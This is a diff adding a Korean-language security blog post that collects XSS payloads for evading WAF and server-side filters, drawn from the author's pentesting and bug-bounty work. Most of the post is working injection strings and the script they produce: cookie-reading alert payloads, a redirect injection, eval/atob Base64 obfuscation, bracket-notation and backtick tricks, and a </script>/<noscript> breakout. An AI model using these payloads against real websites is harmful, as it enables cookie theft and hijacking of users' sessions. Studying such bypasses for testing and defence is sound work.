@@ -1,0 +1,167 @@
+---
+title: "XSS Bypass WAF & Filtering 기법"
+description: "모의해킹 및 버그바운티 시 XSS 취약점 분석에서 얻은 WAF 우회 및 필터링 우회 기법"
+date: 2019-10-15
+tags: ["web-security", "xss", "bypass", "waf"]
+category: "Security Research"
+published: true
+---
+
+# Web Hacking XSS Bypass WAF & Bypass Filtering
+
+## Summary
+
+본 글은 각종 모의해킹 및 버그바운티 시 XSS 취약점을 분석하며 얻은 경험을 토대로 작성한 글입니다.
+
+서버 소스코드단의 필터링 및 네트워크단의 WAF 필터링 등을 우회하여 XSS Exploit을 성공시키기 위한 기법들을 일부 정리하였습니다.
+
+---
+
+## Example 1
+
+### 조건 1
+`https://ar9ang3.com/?param1=abc`로 요청했을 시 (GET/POST)
+
+### 조건 2
+서버단에 요청한 URI가 직접 javascript단으로 삽입될 경우
+
+```html
+<script>
+document.location.href = 'https://ar9ang3.tistory.com/?param1=abc';
+</script>
+```
+
+### 제약조건 3
+`%3b`(;), `%2b`(+)가 WAF단에서 필터링되어 `document.location.href=`를 벗어나지 못할 경우
+
+---
+
+## 우회 및 XSS 트리거 코드 1 (Reflected XSS)
+
+문자열 - Native Function - 문자열 을 수행할 시 문자열의 결과를 연산하는 과정에서 Native Function이 실행되게 됩니다.
+
+```
+?param1=abc'-alert(document.cookie)-'def
+```
+
+결과:
+```html
+<script>
+document.location.href = 'https://ar9ang3.tistory.com/?param1=abc'-alert(document.cookie)-'def';
+</script>
+```
+
+## 우회 및 XSS 트리거 코드 2 (Redirect to other Site)
+
+`&&` 연산자를 이용:
+
+```
+?param1=abc'&&'https://ar9ang3.com/
+```
+
+결과:
+```html
+<script>
+document.location.href = 'https://ar9ang3.tistory.com/?param1=abc'&&'https://ar9ang3.com/';
+</script>
+```
+
+문자열 && 문자열 을 할 시 뒤의 문자열이 최종적으로 적용되기 때문에 원하는 페이지로 redirect 가능
+
+---
+
+## WAF Bypass Tips
+
+### `.` 필터링 시
+```javascript
+document.cookie => document['cookie']
+```
+
+### `"` 필터링 시
+```javascript
+eval("alert(1)") => eval[alert(1)]
+```
+
+### `;`나 `+` 필터링 시
+```javascript
+'abc'-alert(1)-'def' => 'abc'-alert(1)^1&&'normal_string_here'
+```
+
+### 종합 예시
+```javascript
+'abc'-eval[alert(document['cookie'])]^1&&'normal_string_here'
+```
+
+---
+
+## More Filtering Bypass Tips
+
+임의의 자바스크립트 구문을 삽입할 수 있다고 가정 시 두 가지를 고려:
+
+1. 삽입된 자바스크립트 구문으로 인하여 **문법 에러**가 유발되지 않는지
+2. 삽입하는 자바스크립트 구문이 **필터링**되지 않는지
+
+### Method: `</script>`와 `<noscript>`를 이용
+
+```html
+<script>
+try {
+if ('injection'==<%=request.getParameter("param")%>) {
+var a = "blahblah";
+}
+} catch(e) { }
+alert(document.cookie);
+</script>
+<noscript>";
+}
+...
+```
+
+두 삽입지점 사이의 코드를 문자열화하려면 `` ` ``(Back Quote)를 사용하거나 `/* */` 주석을 이용
+
+---
+
+## 필터링 문자별 우회 방법
+
+필터링되는 문자: `<`, `>`, `'`, `"`, `(`, `)`, `` ` ``, `;`, `%`, `&`, `+`
+
+### Native function 자체 필터링 시
+```javascript
+var a=alert; a(document.cookie);
+```
+
+### `document.cookie` 등 필터링 시
+```javascript
+var a='alert'; var b='(documen'; var c='t.cooki'; var d='e)'; var e=eval; e(a+b+c+d);
+```
+
+### 문자열 필터링 시 (Base64 인코딩)
+```javascript
+var a=eval; a(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="));
+```
+
+### `'` / `"` 필터링 시
+```
+?param_a=\&param_b=;alert(document.cookie);var%20z='
+```
+
+결과:
+```javascript
+var a='\'; var b=';alert(document.cookie);var z='';
+```
+
+### 괄호 `( )` 필터링 시
+```javascript
+alert`123`;
+btoa.constructor`alert\x28document.cookie\x29```
+```
+
+---
+
+## 마치며
+
+XSS의 경우 Mitigation 구현도 다양하고 삽입되는 위치와 상황도 모두 다 다양합니다.
+
+천편일률적인 우회 기법이 아니라 **그때그때 상황에 맞추어 우회하는것이 중요**합니다.
+
+최근 한글 XSS, 가타카나 XSS 등 새로운 방법들이 계속 나오고 있습니다.
